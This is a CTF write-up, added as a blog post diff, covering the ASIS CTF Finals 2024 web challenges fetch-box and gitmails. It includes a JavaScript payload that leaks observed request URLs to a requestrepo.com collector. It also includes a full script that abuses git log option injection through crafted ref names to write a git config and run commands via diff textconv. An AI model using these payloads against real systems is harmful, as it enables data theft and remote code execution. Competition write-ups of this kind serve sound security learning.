@@ -1,0 +1,114 @@
+---
+title: ASIS CTF Finals 2024 Write-Up
+date: 2024-12-29T21:24:51+08:00
+image: https://asisctf.com/images/logo-new-black.png
+lang: en
+tags:
+-   writeup
+-   ctf
+---
+
+Write-up for [ASIS CTF Finals 2024](https://ctftime.org/event/2403) — Web challenges fetch-box and gitmails.
+
+<Excerpt />
+
+## fetch-box (19 solves)
+
+Use `PerformanceObserver` to observe `fetch` requests:
+
+```javascript
+new PerformanceObserver((list) => {
+    list.getEntries().forEach((entry) => {
+        if (entry.name.includes('/ping?')) {
+            location = 'https://*.requestrepo.com/' + entry.name;
+        }
+    });
+}).observe({entryTypes: ['resource']});
+```
+
+BTW, service worker does not work because it's not HTTPS.
+
+## gitmails (5 solves)
+
+### `git log` option injection
+
+```python
+            emails = check_output(
+                ['git', 'log', '--pretty=format:%ae', 
+                *([f'--author={author}'] if author else []),
+                branch],
+                cwd=repo_dir
+```
+
+Here the `branch` is supposed to be a branch, but it will be an option if it starts with `-`.
+
+The `git` CLI does not allow such branch names, but we can modify the refs directly. For example:
+
+```bash
+cp .git/refs/heads/master .git/refs/heads/--output=config
+```
+
+### `git log --output` for file writing
+
+We can use `git log --output` to write the log to arbitrary file. Find this in `man git log` or [git | GTFOArgs](https://gtfoargs.github.io/gtfoargs/git/).
+
+As `--pretty=format:%ae` is set, we can use the email of each commit for each line in the output, e.g.:
+
+```bash
+GIT_AUTHOR_EMAIL="pager = /readflag" git commit --allow-empty -m nothing
+GIT_AUTHOR_EMAIL='[core]' git commit --allow-empty -m nothing
+```
+
+### Approaches that do not work
+
+-   `core.fsmonitor`: Does not work in bare repository.
+-   `core.pager`: The output pipes into the `check_output` function without an interactive tty, so Git does not use a pager.
+-   `core.alternateRefsCommand`: Need a known path to an `objects` directory that is not the current repository.
+-   `diff.external` / `diff.<driver>.command`: Need both `-p` and `--ext-diff` but we can only inject a single option.
+
+### `textconv` for command execution
+
+`diff.<driver>.textconv` can be used to execute arbitrary command with `git log -p`.
+
+The `textconv` command is called as `<cmd> <filename>`, so we can use `textconv = /readflag '--give-me-the-f|ag' | tee` to output the flag.
+
+We need to set the diff driver in the `info/attributes` file, such as `* [diff=flag]` and `[diff "flag"] textconv = /readflag`.
+
+However, we only have a single commit log (the branch argument is used as an option instead), so we will have identical `config` and `info/attributes`, but they have different syntax and contents.
+
+The `config` needs to be completely valid, while `attributes` may have syntax errors. So we can append `a= diff=flag` to `config`, which is the attribute we need and also a valid line in `config`. Then add a file with name `a=` in the repository to see the diff.
+
+### Hosting the repository
+
+If we don't want to use a public service like GitHub, we should host the repository to support read-only HTTP clone.
+
+It's actually super easy. Just run `git --bare update-server-info` in the `.git` directory and run an HTTP server.
+
+### Final script
+
+```bash
+#!/bin/bash
+
+set -euo pipefail
+
+mkdir exp
+cd exp
+git init
+
+touch a=
+git add .
+GIT_AUTHOR_EMAIL='a= diff=flag' git commit -m nothing
+GIT_AUTHOR_EMAIL="textconv = /readflag '--give-me-the-f|ag' | tee" git commit --allow-empty -m nothing
+GIT_AUTHOR_EMAIL='[diff "flag"]' git commit --allow-empty -m nothing
+
+cd .git
+cp refs/heads/master refs/heads/--output=config
+mkdir refs/heads/--output=info
+cp refs/heads/master refs/heads/--output=info/attributes
+cp refs/heads/master refs/heads/-p
+
+git --bare update-server-info
+python -m http.server 1337
+```
+
+Then ask the challenge server to clone your HTTP git server.
